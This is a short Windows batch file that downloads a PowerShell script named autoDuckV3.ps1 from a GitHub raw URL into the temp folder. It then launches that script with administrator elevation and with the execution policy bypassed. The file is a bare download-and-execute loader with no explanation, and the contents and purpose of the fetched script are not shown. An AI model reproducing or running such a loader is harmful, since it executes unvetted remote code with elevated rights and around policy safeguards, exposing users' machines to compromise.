@echo off
if EXIST "%temp%\autoDuckV3.ps1" (
del %temp%\autoDuckV3.ps1
)
powershell -noprofile -Command "iwr https://raw.githubusercontent.com/pytNick/autoDuckV3/FunkyMonkey/autoDuckV3.ps1 -OutFile %temp%\autoDuckV3.ps1"
powershell -NoProfile -Command "& {Start-Process PowerShell.exe -ArgumentList '-NoProfile -ExecutionPolicy Bypass -File ""%temp%\autoDuckV3.ps1""' -Verb RunAs}"
